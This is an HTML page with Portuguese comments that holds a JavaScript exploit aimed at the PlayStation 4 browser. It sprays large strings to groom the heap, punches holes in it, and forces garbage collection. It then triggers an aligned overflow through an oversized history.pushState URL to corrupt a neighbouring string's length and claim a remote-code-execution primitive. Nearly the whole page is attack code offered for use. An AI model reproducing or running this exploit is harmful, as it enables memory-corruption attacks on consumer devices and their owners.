<!DOCTYPE html>
<html>
<head>
    <title>PS4 Golden Key Exploit3</title>
    <style>
        body { background-color: #000; color: #ffd700; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 100%; border: 2px solid #ffd700; background: #222; color: #fff; font-weight: bold;
            box-shadow: 0 0 15px #ffd700;
        }
        #log { border: 1px solid #555; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; text-align: left;}
        .win { background-color: #ffd700; color: #000; font-size: 20px; padding: 10px; font-weight: bold; }
    </style>
</head>
<body>

    <h1>A Chave de Ouro (Offset 709.520)</h1>
    <p>Usando alinhamento correto para corromper o vizinho sem crash.</p>

    <button onclick="runGoldenExploit()">INICIAR EXPLOIT ALINHADO</button>
    
    <div id="log">Pronto. Reinicie o console (Obrigatório).</div>

    <script>
        // O NOVO OFFSET MÁGICO
        const ALIGNED_OFFSET = 709516;
        
        // Vamos escrever bastante para garantir que pegamos o Length do vizinho
        const OVERFLOW_AMT = 1024 * 64; // 64KB

        // Tamanho do Balde Alvo (4MB - Baseado nos seus testes de sobrevivência)
        const BUCKET_SIZE = 1024 * 1024 * 4; 
        
        // Tamanho da Vítima (String)
        // Tentamos encher o balde de 4MB
        const STRING_LEN = BUCKET_SIZE - 400; 
        const SPRAY_COUNT = 40; // Strings gigantes, poucas unidades

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function runGoldenExploit() {
            log("1. Alocando Strings Gigantes (4MB)...");

            setTimeout(() => {
                try {
                    // Prepara a vítima
                    let pad = "B".repeat(STRING_LEN);
                    victims = [];

                    // SPRAY
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let prefix = `IDX:${i}_`;
                        // Ajusta o tamanho exato
                        let s = prefix + pad.substring(prefix.length);
                        victims.push(s);
                    }

                    // FENG SHUI (Buracos)
                    log("2. Criando buracos para encaixar o exploit...");
                    for(let i=0; i<SPRAY_COUNT; i+=2) {
                        victims[i] = null;
                    }

                    // Força GC pesado
                    forceGC().then(() => {
                        log("3. Disparando Overflow Alinhado (A partir de 709.520)...");
                        triggerExploit();
                    });

                } catch(e) {
                    log("Erro (OOM): " + e.message);
                }
            }, 500);
        }

        function triggerExploit() {
            setTimeout(() => {
                try {
                    // PARTE 1: Enche até o alinhamento perfeito (520)
                    let buffer = "A".repeat(ALIGNED_OFFSET);
                    
                    // PARTE 2: A Invasão Silenciosa (0x01)
                    // Agora que estamos alinhados, sobrescrevemos o cabeçalho do vizinho
                    // com 0x0101010101010101 (Um número válido!)
                    buffer += "\x01".repeat(OVERFLOW_AMT);

                    history.pushState({}, "golden_pwn", "/" + buffer);

                    log("4. Verificando vítimas...");
                    checkCorruption();

                } catch (e) {
                    log("Erro no exploit: " + e.message);
                }
            }, 500);
        }

        function checkCorruption() {
            let found = false;
            // Checa as strings que sobraram (Ímpares)
            for(let i=1; i<victims.length; i+=2) {
                let v = victims[i];
                if(!v) continue;

                // Se o tamanho mudou, vencemos o jogo.
                if (v.length !== STRING_LEN) {
                    log(`!!! SUCESSO !!! Vítima ${i} Corrompida!`, 'win');
                    log(`Tamanho Original: ${STRING_LEN}`);
                    log(`Novo Tamanho: ${v.length}`);
                    found = true;
                    alert("RCE PRIMITIVE ACHIEVED!");
                    break;
                }
                
                // Checagem de conteúdo
                if (v.charCodeAt(0) === 1) {
                    log(`!!! SUCESSO (Conteúdo) !!! Vítima ${i}`, 'win');
                    found = true;
                    break;
                }
            }
            if(!found) log("Nenhuma string atingida. Tente ajustar o STRING_LEN.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 1000));
        }
    </script>
</body>
</html>


